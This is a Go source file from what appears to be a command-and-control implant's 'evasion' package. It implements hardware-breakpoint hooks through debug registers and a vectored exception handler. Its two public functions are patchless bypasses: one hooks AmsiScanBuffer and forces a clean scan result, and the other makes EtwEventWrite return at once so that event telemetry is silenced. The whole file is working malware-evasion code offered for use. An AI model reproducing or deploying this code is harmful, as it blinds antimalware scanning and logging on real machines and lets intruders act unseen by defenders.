//go:build windows

package evasion

import (
	"fmt"
	"unsafe"

	"golang.org/x/sys/windows"

	winsyscall "github.com/mjopsec/taburtuaiC2/implant/syscall"
)

// HWBPSlot identifies one of the four hardware debug register slots (0–3).
type HWBPSlot int

// ─── AMD64 CONTEXT layout ────────────────────────────────────────────────────

type threadContext struct {
	P1Home, P2Home, P3Home, P4Home, P5Home, P6Home uint64
	ContextFlags                                    uint32
	MxCsr                                           uint32
	SegCs, SegDs, SegEs, SegFs, SegGs, SegSs        uint16
	EFlags                                          uint32
	Dr0, Dr1, Dr2, Dr3, Dr6, Dr7                   uint64
	Rax, Rcx, Rdx, Rbx, Rsp, Rbp, Rsi, Rdi        uint64
	R8, R9, R10, R11, R12, R13, R14, R15           uint64
	Rip                                             uint64
	_fp                                             [976]byte
}

const (
	exceptionSingleStep     uint32  = 0x80000004
	exceptionContinueExec   uintptr = 0
	exceptionContinueSearch uintptr = 1
	ctxAMD64                uint32  = 0x00100000
	ctxDebugReg             uint32  = ctxAMD64 | 0x10
	ctxFull                 uint32  = ctxAMD64 | 0x0F
)

type exceptionRecord struct {
	ExceptionCode    uint32
	ExceptionFlags   uint32
	ExceptionRecord  *exceptionRecord
	ExceptionAddress uintptr
	_                [19]uintptr
}

type exceptionPointers struct {
	ExceptionRecord *exceptionRecord
	ContextRecord   *threadContext
}

// ─── Internal state ──────────────────────────────────────────────────────────

type hwbpEntry struct {
	addr    uintptr
	handler func(*threadContext) bool
}

var (
	hwbpTable     [4]hwbpEntry
	hwbpVEHHandle uintptr
)

//go:nosplit
func hwbpVEHProc(epRaw uintptr) uintptr {
	ptrs := (*exceptionPointers)(unsafe.Pointer(epRaw))
	rec := ptrs.ExceptionRecord
	ctx := ptrs.ContextRecord

	if rec.ExceptionCode != exceptionSingleStep {
		return exceptionContinueSearch
	}
	for i := 0; i < 4; i++ {
		if hwbpTable[i].addr == 0 {
			continue
		}
		dr6Bit := uint64(1 << uint(i))
		if ctx.Dr6&dr6Bit == 0 {
			continue
		}
		ctx.Dr6 &^= dr6Bit
		savedDR7 := ctx.Dr7
		ctx.Dr7 &^= uint64(1) << (uint(i) * 2)
		if hwbpTable[i].handler != nil && hwbpTable[i].handler(ctx) {
			ctx.Dr7 = savedDR7
		}
		return exceptionContinueExec
	}
	return exceptionContinueSearch
}

func hwbpApplyAll(slot int, addr uintptr, enable bool) error {
	pid := windows.GetCurrentProcessId()
	snap, _, _ := winsyscall.ProcCreateToolhelp32Snapshot.Call(uintptr(winsyscall.Th32csSnapThread), 0)
	if snap == ^uintptr(0) {
		return fmt.Errorf("hwbp: CreateToolhelp32Snapshot failed")
	}
	defer windows.CloseHandle(windows.Handle(snap))

	type threadEntry32 struct {
		Size, Usage, ThreadID, OwnerProcessID uint32
		BasePriority, DeltaPriority           int32
		Flags                                 uint32
	}
	var te threadEntry32
	te.Size = uint32(unsafe.Sizeof(te))

	r, _, _ := winsyscall.ProcThread32First.Call(snap, uintptr(unsafe.Pointer(&te)))
	for r != 0 {
		if te.OwnerProcessID == pid {
			hwbpApplyThread(te.ThreadID, slot, addr, enable)
		}
		r, _, _ = winsyscall.ProcThread32Next.Call(snap, uintptr(unsafe.Pointer(&te)))
	}
	return nil
}

func hwbpApplyThread(tid uint32, slot int, addr uintptr, enable bool) {
	hThread, _, _ := winsyscall.ProcOpenThread.Call(uintptr(winsyscall.ThreadAllAccess), 0, uintptr(tid))
	if hThread == 0 {
		return
	}
	defer windows.CloseHandle(windows.Handle(hThread))

	winsyscall.ProcSuspendThread.Call(hThread)
	defer winsyscall.ProcResumeThread.Call(hThread)

	var ctx threadContext
	ctx.ContextFlags = ctxFull | ctxDebugReg
	winsyscall.ProcGetThreadContext.Call(hThread, uintptr(unsafe.Pointer(&ctx)))

	drPtrs := [4]*uint64{&ctx.Dr0, &ctx.Dr1, &ctx.Dr2, &ctx.Dr3}
	if enable {
		*drPtrs[slot] = uint64(addr)
		ctx.Dr7 |= uint64(1) << (uint(slot) * 2)
	} else {
		*drPtrs[slot] = 0
		ctx.Dr7 &^= uint64(1) << (uint(slot) * 2)
	}
	winsyscall.ProcSetThreadContext.Call(hThread, uintptr(unsafe.Pointer(&ctx)))
}

func hwbpEnsureVEH() error {
	if hwbpVEHHandle != 0 {
		return nil
	}
	cb := windows.NewCallback(hwbpVEHProc)
	h, _, _ := winsyscall.ProcAddVectoredExceptionHandler.Call(1, cb)
	if h == 0 {
		return fmt.Errorf("hwbp: AddVectoredExceptionHandler failed")
	}
	hwbpVEHHandle = h
	return nil
}

func hwbpSetSlot(slot int, addr uintptr, handler func(*threadContext) bool) error {
	if slot < 0 || slot > 3 {
		return fmt.Errorf("hwbp: slot must be 0–3")
	}
	if hwbpTable[slot].addr != 0 {
		hwbpApplyAll(slot, 0, false) //nolint:errcheck
	}
	hwbpTable[slot] = hwbpEntry{addr: addr, handler: handler}
	if err := hwbpApplyAll(slot, addr, true); err != nil {
		hwbpTable[slot] = hwbpEntry{}
		return err
	}
	return hwbpEnsureVEH()
}

func hwbpClearSlot(slot int) error {
	if slot < 0 || slot > 3 {
		return fmt.Errorf("hwbp: slot must be 0–3")
	}
	hwbpApplyAll(slot, 0, false) //nolint:errcheck
	hwbpTable[slot] = hwbpEntry{}
	return nil
}

func hwbpClearAll() {
	for i := 0; i < 4; i++ {
		if hwbpTable[i].addr != 0 {
			hwbpApplyAll(i, 0, false) //nolint:errcheck
			hwbpTable[i] = hwbpEntry{}
		}
	}
	if hwbpVEHHandle != 0 {
		winsyscall.ProcRemoveVectoredExceptionHandler.Call(hwbpVEHHandle)
		hwbpVEHHandle = 0
	}
}

// ─── Public API ──────────────────────────────────────────────────────────────

// SetHWBP installs a tracing breakpoint on slot at addr.
func SetHWBP(slot HWBPSlot, addr uintptr, callback func(uintptr)) error {
	return hwbpSetSlot(int(slot), addr, func(ctx *threadContext) bool {
		if callback != nil {
			callback(addr)
		}
		return true
	})
}

// ClearHWBP removes the breakpoint on slot.
func ClearHWBP(slot HWBPSlot) error {
	return hwbpClearSlot(int(slot))
}

// BypassAMSIHWBP places a patchless execute-breakpoint on AmsiScanBuffer.
func BypassAMSIHWBP() error {
	amsi := windows.NewLazySystemDLL("amsi.dll")
	proc := amsi.NewProc("AmsiScanBuffer")
	if err := proc.Find(); err != nil {
		return fmt.Errorf("AmsiScanBuffer not found (AMSI not loaded): %w", err)
	}
	addr := proc.Addr()
	return hwbpSetSlot(0, addr, func(ctx *threadContext) bool {
		amsiResultPtr := *(*uintptr)(unsafe.Pointer(uintptr(ctx.Rsp) + 0x28))
		if amsiResultPtr != 0 {
			*(*uint32)(unsafe.Pointer(amsiResultPtr)) = 1
		}
		ctx.Rax = 0
		ctx.Rip = *(*uint64)(unsafe.Pointer(uintptr(ctx.Rsp)))
		ctx.Rsp += 8
		return true
	})
}

// BypassETWHWBP places a patchless execute-breakpoint on EtwEventWrite.
func BypassETWHWBP() error {
	etwAddr := winsyscall.ModNtdll.NewProc("EtwEventWrite").Addr()
	if etwAddr == 0 {
		return fmt.Errorf("EtwEventWrite not found in ntdll")
	}
	return hwbpSetSlot(1, etwAddr, func(ctx *threadContext) bool {
		ctx.Rax = 0
		ctx.Rip = *(*uint64)(unsafe.Pointer(uintptr(ctx.Rsp)))
		ctx.Rsp += 8
		return true
	})
}
